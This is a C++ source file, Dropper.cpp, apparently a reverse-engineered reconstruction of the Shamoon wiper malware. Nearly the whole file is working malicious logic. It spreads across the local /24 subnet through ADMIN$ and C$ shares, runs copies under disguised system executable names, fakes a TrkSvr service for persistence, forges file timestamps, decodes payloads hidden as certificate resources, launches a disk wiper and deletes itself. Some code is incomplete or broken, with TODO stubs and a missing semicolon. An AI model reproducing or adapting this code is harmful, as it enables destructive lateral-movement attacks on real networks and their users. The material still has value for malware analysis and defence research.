/******************************************************************************************
    Copyright 2013 Christian Roggia

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
******************************************************************************************/
// Dropper.cpp
// Contains functions used for dropping the virus onto the local/remote systems

#include "Global.h"
#include "Utils.h"
#include "Dropper.h"

/*  WriteModuleOnSharedPC

    Search the given remote server for the proper system32 directory, then copy the file to
    the targeted computer, renaming it to one of our "trusted" executable names. Then, try
    to add a scheduled job to run the new file. If that fails, create it as a service with
    the name TrkSrv.

    param inFile:    The name of the file to be uploaded/executed
    param remoteSrv: The name of the targeted remote server

    return: True upon success, False otherwise
*/
bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
{
    BOOL v16; // edi@6
    WCHAR *v31; // [sp-8h] [bp-12D4h]@12
    int v32; // [sp-4h] [bp-12D0h]@12
    int v33; // [sp+10h] [bp-12BCh]@6
    int v36; // [sp+20h] [bp-12ACh]@1
    WCHAR v39[1024]; // [sp+28h] [bp-12A4h]@11

    WCHAR NewFileName[256]; // [sp+A28h] [bp-8A4h]@11

    WCHAR csrss_dir[256];
    WCHAR svc_csrss[256];
    WCHAR csrss_locations[6][15] = {L"ADMIN$", L"C$\\WINDOWS", L"D$\\WINDOWS", L"E$\\WINDOWS"};


    WCHAR ExistingFileName[256]; // = "\\" + arg2 + "\\"

    strcpyW(ExistingFileName, L"\\\\", 4);
    strcpyW(&ExistingFileName[2], remoteSrv, 2 * strlenW(remoteSrv));
    strcpyW(&ExistingFileName[strlenW(remoteSrv) + 2], L"\\", 2);
    ExistingFileName[strlenW(remoteSrv) + 3] = 0;

    int file_len = strlenW(ExistingFileName);
    memmove(svc_csrss, ExistingFileName, 2 * file_len);
    int idx;
    // Iterate through the known locations for csrss.exe
    WCHAR *location = *csrss_locations;
    while(1)
    {
        memmove(&svc_csrss[file_len], location, 2 * strlenW(location));
        memmove(&svc_csrss[file_len + strlenW(location)], L"\\system32\\csrss.exe", 2 * strlenW(L"\\system32\\csrss.exe"));
        svc_csrss[file_len + strlenW(location) + strlenW(L"\\system32\\csrss.exe")] = 0;

        if(IsFileAccessible(svc_csrss))
            break;

        ++idx;
        location += 15;
        if(idx >= 4)
        {
            return false;
        }
    }

    memmove(&ExistingFileName[file_len], csrss_locations[idx], 2 * strlenW(csrss_locations[idx]));
    memmove(&ExistingFileName[file_len + strlenW(csrss_locations[idx])], L"\\system32\\", 2 * strlenW(L"\\system32\\") + 2);
    memmove(csrss_dir, ExistingFileName, 2 * strlenW(ExistingFileName) + 2);

    file_len = strlenW(ExistingFileName);

    WCHAR exec_name[30]; // [sp+12A0h] [bp-2Ch]@1
    bool success;

    for( int i = 0; i < 29; i++)
    {
        const WCHAR *tmp_exec_name = Globals.random_exec_name[GetRandom() % 29];
        strcpyW(exec_name, tmp_exec_name, 2 * strlenW(tmp_exec_name));
        strcpyW(&exec_name[strlenW(tmp_exec_name)], L".exe", 2 * strlenW(L".exe") + 2);
        strcpyW(&ExistingFileName[file_len], exec_name, 2 * strlenW(exec_name) + 2);

        success = CopyFileW(inFile, ExistingFileName, 1);
        SetReliableFileTime(ExistingFileName);
        if( success )
            break;
    }

    if( !success )
        return false;


    WCHAR defaultPath[256]; // [sp+828h] [bp-AA4h]@10

    strcpyW(defaultPath, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
    strcpyW(&defaultPath[strlenW(L"%SystemRoot%\\System32\\")], exec_name, 2 * strlenW(exec_name) + 2);

    if(AddNewJob(remoteSrv, defaultPath))
    {
        return true;
    }

    AddNewJob(remoteSrv, exec_name);

    strcpyW(NewFileName, csrss_dir, 2 * strlenW(csrss_dir));
    strcpyW(&NewFileName[strlenW(csrss_dir)], L"trksvr.exe", 2 * strlenW(L"trksvr.exe") + 2);
    strcpyW(v39, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
    DeleteFileW(NewFileName);

    if(!MoveFileW(ExistingFileName, NewFileName))
    {
        v32 = 2 * strlenW(exec_name) + 2;
        v31 = exec_name;
    }
    else
    {
        v32 = 2 * strlenW(L"trksvr.exe") + 2;
        v31 = L"trksvr.exe";
    }

    strcpyW(&v39[strlenW(L"%SystemRoot%\\System32\\")], v31, v32);

    if(ConfigureTrkSvr(remoteSrv, v39))
    {
        return true;
    }

    return 0;
}

/*  WriteModuleOnSharedNetwork

    Tries to copy itself to any PC on the same /24 network by finding each IP the
    localhost has and attempting to copy to every IP in the network. After all
    attempts are made, schedules itself for deletion on next reboot.

    params: None

    return: False if Globals.argv hasn't been assigned, or WSAStartup fails. True
            otherwise
*/
bool WriteModuleOnSharedNetwork()
{
    struct in_addr in; // [sp+14h] [bp-1FCh]@8
    struct WSAData WSAData; // [sp+20h] [bp-1F0h]@4
    WCHAR szPC_IP[20]; // [sp+1B0h] [bp-60h]@11
    char szHostname[50]; // [sp+1D8h] [bp-38h]@4

    if(!Globals.argv)
        return false;

    strset(szHostname, 0, 50);
    if(WSAStartup(257, &WSAData))
    {
        WSACleanup();
        return false;
    }

    gethostname(szHostname, 50);
    struct hostent *sHost = gethostbyname(szHostname);

    DWORD dwCurrentAddr;
    char **szAddrList;
    for(szAddrList = sHost->h_addr_list, dwCurrentAddr = 0; *szAddrList, dwCurrentAddr < 10; szAddrList = &sHost->h_addr_list[dwCurrentAddr++])
    {
        strcpyW((WCHAR *)&in.S_un.S_un_b.s_b1, (const WCHAR *)*szAddrList, sHost->h_length);

        UINT8 b8CurrentLastIpByte = in.s_impno, b8LastIpByte = 1;
        do
        {
            if(b8CurrentLastIpByte != b8LastIpByte)
            {
                in.s_impno = b8LastIpByte;

                if(strlen(inet_ntoa(in)) <= 19)
                {
                    btowc(inet_ntoa(in), szPC_IP, strlen(inet_ntoa(in)));
                    WriteModuleOnSharedPC(Globals.module_path, szPC_IP);
                }
            }
        }
        while(++b8LastIpByte < 255);
    }

    WSACleanup();
    ForceFileDeletion(Globals.argv[0]); // delete itself

    return true;
}

/* WriteModuleOnSharedPCByArgv

    Copies itself into all computers specified by command-line arguments

    param: None

    return: True if Globals.argv has been assigned, false otherwise
*/
bool WriteModuleOnSharedPCByArgv()
{
    if(Globals.argv)
    {
        for(int i = 1; i < Globals.argc; ++i)
            WriteModuleOnSharedPC(Globals.module_path, Globals.argv[i]);

        return true;
    }

    return false;
}

/*  CopyCurrentExecutableToTrkSvr

    Copies itself to trksrv.exe, starts a service with it, then tries to delete
    trksrv.exe. If that fails, it's scheduled for delete on reboot.

    param: None

    return: True upon success, false otherwise
*/
bool CopyCurrentExecutableToTrkSvr()
{
    PVOID oldValue = NULL;
    _Wow64DisableWow64FsRedirection(&oldValue);

    if(!Globals.argv || !CopyFileW(Globals.argv[0], Globals.trksvr_path, FALSE))
    {
        _Wow64RevertWow64FsRedirection(oldValue);
        return false;
    }
    _Wow64RevertWow64FsRedirection(oldValue);

    SetReliableFileTime(Globals.trksvr_path);
    if(ConfigureTrkSvr(0, Globals.trksvr_path))
        return true;

    ForceFileDeletion(Globals.trksvr_path);
    return false;
}

/*  SetupTrkSvrService

    32-bit only; Will decode the executable from the 116th resource, copy it
    into System32/trksrv.exe, then start a process with a cmd string such that the
    service will be started with our new executable after approx. 40 seconds.
*/
bool SetupTrkSvrService()
{
    struct _STARTUPINFOW StartupInfo; // [sp+Ch] [bp-4D0h]@16
    struct _PROCESS_INFORMATION ProcessInformation; // [sp+50h] [bp-48Ch]@16
    SC_HANDLE service_manager_handle; // [sp+60h] [bp-47Ch]@2
    SC_HANDLE service_handle; // [sp+64h] [bp-478h]@3
    LPQUERY_SERVICE_CONFIGW service_config; // [sp+68h] [bp-474h]@6
    DWORD pcbBytesNeeded; // [sp+6Ch] [bp-470h]@4
    bool service_file_written; // [sp+73h] [bp-469h]@3
    WCHAR command_line[256]; // [sp+74h] [bp-468h]@16
    WCHAR svc_path[256]; // [sp+274h] [bp-268h]@9
    WCHAR svc_filename[50]; // [sp+474h] [bp-68h]@9

    if(!Is32Bit() || (service_manager_handle = OpenSCManagerW(0, 0, SC_MANAGER_ALL_ACCESS)) == 0)
        return false;

    service_file_written = 0;
    service_handle = OpenServiceW(service_manager_handle, L"TrkSvr", SC_MANAGER_ALL_ACCESS);

    if(service_handle)
    {
        pcbBytesNeeded = 0;
        if(!QueryServiceConfigW(service_handle, 0, 0, &pcbBytesNeeded) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
            service_config = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);

        if(QueryServiceConfigW(service_handle, service_config, pcbBytesNeeded, &pcbBytesNeeded))
        {
            if(strcmpW(&service_config->lpBinaryPathName[strlenW(service_config->lpBinaryPathName) - strlenW(L"trksvr.exe")], L"trksvr.exe"))
            {
                // Load the 116th resource from our own process, designed to assume the identity of a X.509 cert
                //  when it's really just our encoded dropper
                if(WriteEncodedResource(Globals.trksvr_path, 0, (LPCWSTR)0x74, L"X509", Globals.keys[KEY_X509], 4))
                {
                    SetReliableFileTime(Globals.trksvr_path);
                    service_file_written = true;
                }
                else
                {
                    service_file_written = false;
                }
            }
        }
        CloseServiceHandle(service_handle);
    }
    CloseServiceHandle(service_manager_handle);

    if(!service_file_written)
        return false;

    strcpyW(command_line, Globals.windows_directory, 2 * strlenW(Globals.windows_directory));
    strcpyW(&command_line[strlenW(Globals.windows_directory)], TRKSRV_CMD, 2 * strlenW(TRKSRV_CMD) + 2);

    memset(&StartupInfo, 0, 0x44);
    memset(&ProcessInformation, 0, 0x10);

    // Make the TrkSvr with our virus loaded in run
    if(!CreateProcessW(NULL, command_line, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &ProcessInformation))
        return false;

    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(StartupInfo.hStdError);
    CloseHandle(StartupInfo.hStdInput);
    CloseHandle(StartupInfo.hStdOutput);

    return true;
}

/* ConfigureTrkSvr

    For 64-bit dropping of the dropper( this program ) into trksrv.exe. Can target
    local and remote machines. Make the LanmanWorkstation service rely on our
    TrkSvr service.

    param lpMachineName: String containing name of remote machine, or NULL for local
                         machine
    param path:          Path to the executable to use for the service( trksrv.exe )

    return:              True upon success, False if it fails
*/
bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
{
    SC_HANDLE hSCManager; // [sp+Ch] [bp-400h]@1
    LPCWSTR svc_path;
    DWORD pcbBytesNeeded; // [sp+18h] [bp-3F4h]@4
    SC_HANDLE svc_trksrv; // [sp+1Ch] [bp-3F0h]@3
    LPQUERY_SERVICE_CONFIGW lpServiceConfig;

    WCHAR *service_info = "Enables the Distributed Link Tracking Client service within the same domain to provide more reliable and efficient maintenance of links within the domain. If this service is disabled, any services that explicitly depend on it will fail to start.";
    svc_path = path;

    hSCManager = OpenSCManagerW(lpMachineName, NULL, SC_MANAGER_ALL_ACCESS);
    if(!hSCManager) return 0;

    svc_trksrv = OpenServiceW(hSCManager, L"TrkSvr", SC_MANAGER_ALL_ACCESS);
    /** ----->> If the service does not exists create it. <<----- **/
    if(!svc_trksrv)
    {
        if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
        {
            svc_trksrv = CreateServiceW(hSCManager, L"TrkSvr", L"Distributed Link Tracking Server", 0xF01FF, 0x10, 2, 0, svc_path, 0, 0, L"RpcSs", 0, 0);
            if( !svc_trksrv )
                return false;

            // Change the service description
            ChangeServiceConfig2W(svc_trksrv, SERVICE_CONFIG_DESCRIPTION, &service_info);
        }
        else
        {
            CloseServiceHandle(hSCManager);
            return false;
        }
    }
    else
    {
        pcbBytesNeeded = 0;
        if(!QueryServiceConfigW(svc_trksrv, NULL, NULL, &pcbBytesNeeded) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
            lpServiceConfig = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);

        if(QueryServiceConfigW(svc_trksrv, lpServiceConfig, pcbBytesNeeded, &pcbBytesNeeded))
        {

            /** ----->> Compare the last 3 characters of the dependencies with "vcs" (???) <<----- **/
            //v5 = (WCHAR *)&byte_416552[strlenW(L"C:\\Windows\\system32\\svchost.exe -k netsvcs")]; // Strange
            if(!strcmpW(&lpServiceConfig->lpBinaryPathName[strlenW(lpServiceConfig->lpBinaryPathName) - 3], L"vcs")) // L"vcs" = v5
            {
                CloseServiceHandle(svc_trksrv);
                CloseServiceHandle(hSCManager);
                return false;
            }

            /** ----->> Change service config, register it as startup service <<----- **/
            ChangeServiceConfigW(svc_trksrv, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, svc_path, NULL, 0, L"RpcSs", NULL, NULL, NULL);
        }
    }

    HKEY reg_key;
    if(!lpMachineName && !RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\TrkSvr", 0, KEY_ALL_ACCESS, &reg_key))
    {
        RegDeleteValueW(reg_key, L"WOW64");
        RegCloseKey(reg_key);
    }

    /** ----->> Finally start the service <<----- **/
    StartServiceW(svc_trksrv, 0, NULL);
    CloseServiceHandle(svc_trksrv);


    SC_HANDLE svc_lanman = OpenServiceW(hSCManager, L"LanmanWorkstation", SC_MANAGER_ALL_ACCESS);
    if(svc_lanman)
    {
        LPQUERY_SERVICE_CONFIGW svc_config;

        pcbBytesNeeded = 0;
        if(QueryServiceConfigW(svc_lanman, 0, 0, &pcbBytesNeeded) || GetLastError() != 122)
            svc_config = (LPQUERY_SERVICE_CONFIGW)lpMachineName;
        else
            svc_config = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);

        if(QueryServiceConfigW(svc_lanman, svc_config, pcbBytesNeeded, &pcbBytesNeeded))
        {
            WCHAR Dependencies[500];

            WCHAR *dep = svc_config->lpDependencies;
            INT32 dep_len = 0;
            INT32 dep_size = 0;

            // copy dependencies into array
            if(dep && *dep)
            {
                while(dep[dep_len] || dep[dep_len + 1])// Account for null bytes
                    ++dep_len;

                dep_size = dep_len + 1;
                strcpyW(Dependencies, dep, 2 * dep_size);
            }

            // Add TrkSvr to the dependencies if we haven't already
            if(!strcmpW(L"TrkSvr", &Dependencies[dep_size - strlenW(L"TrkSvr") + 1]))
            {
                strcpyW(&Dependencies[dep_size], L"TrkSvr", 2 * strlenW(L"TrkSvr"));
                Dependencies[dep_size + strlenW(L"TrkSvr")] = 0;
                Dependencies[dep_size + strlenW(L"TrkSvr") + 1] = 0;
                ChangeServiceConfigW(svc_lanman, svc_config->dwServiceType, svc_config->dwStartType, svc_config->dwErrorControl, 0, 0, 0, Dependencies, 0, 0, 0);
            }
        }

        CloseServiceHandle(svc_lanman);
    }

    CloseServiceHandle(hSCManager);
    return 1;
}

/** ----->> TODO: Understand what kind of std:: class is <<----- **/
//std::basic_ios<char> byte_41E2E0;

/* CopyAndRunWiper

    Copies the decoded wiper from the 112th resource to the local PC, then start a
    service to run it.

    param: None

    return: False if the process is already running or we fail to get a new random
            executable name; True otherwise
*/
bool CopyAndRunWiper()
{
    char *v12; // [sp+C8h] [bp-218h]@1
    WCHAR svc_path[250]; // [sp+D0h] [bp-210h]@4

    v12 = ATT_RANDOM;

    /** ----->> TODO: Understand what kind of std:: class is <<----- **/
    //std::vector<> v9(byte_41E2E0);

    /** ----->> TODO: Check this part <<----- **/
    /*std::ofstream v6("c:\\windows\\temp\\out17626867.txt");
    if(v6.is_open())
    {
        v6.write(v12, strlen(v12));
        v6.close();
    }*/
    /** ------>> TODO: End of part to check <<-----**/

    Globals.svc_id = NULL
    Globals.svc_id = SearchProcessByIdOrName(Globals.svc_id, Globals.svc_name);
    if(!Globals.svc_id)
    {
        if(!GetRandomServiceInfo(Globals.svc_name, svc_path))
            return false;

        if(!WriteEncodedResource(svc_path, 0, (LPCWSTR)0x70, L"PKCS12", Globals.keys[KEY_PKCS12], 4)) // Wiper
        {
            Exploit();
            return true;
        }

        SetReliableFileTime(svc_path);

        Globals.svc_id = 0;
        if(StartServiceProcess(Globals.svc_name, svc_path, &Globals.svc_id)) // Execute the wiper
        {
            Exploit();
        }


        return true;
    }
    else
    {
        Exploit();
    }

    return false;
}

/*  Exploit

    Used by CopyAndRunWiper

    Noooo idea what this does at the moment. Maybe uses some exploit in bitmap handing to
    achieve privilege escalation?

    param: None

    return: None
*/
inline bool Exploit()
{
    HANDLE img = LoadImageW(NULL, L"myimage12767", IMAGE_BITMAP, 0, 0, LR_MONOCHROME);
    if(img)
    {
        /** ----->> TODO: Understand what kind of std:: class is <<----- **/
        //sub_404D73(byte_41E2E0, img, 18, 0);
    }
    else
    {
        char *v5 = new char[25];

        memset(v5, 64, 20);
        /** ----->> TODO: Understand what kind of std:: class is <<----- **/
        //sub_404D73(byte_41E2E0, v5, 18, 0);

        if(v5) delete [] v5;
    }
}

/*  IsFileAccessible

    Used by WriteModuleOnSharedPC to determine if csrss.exe can be found by trying to
    open it

    param lpFileName:   File to check

    return: True if the file is able to be opened, false otherwise
*/
inline bool IsFileAccessible(LPCWSTR lpFileName)
{
    PVOID oldValue = NULL;
    _Wow64DisableWow64FsRedirection(&oldValue);
    HANDLE file_handle = CreateFileW(lpFileName, GENERIC_READ, 1, 0, 3, FILE_FLAG_OPEN_NO_RECALL, 0);
    _Wow64RevertWow64FsRedirection(oldValue);

    if(file_handle == INVALID_HANDLE_VALUE)
        return false;

    CloseHandle(file_handle);
    return true;
}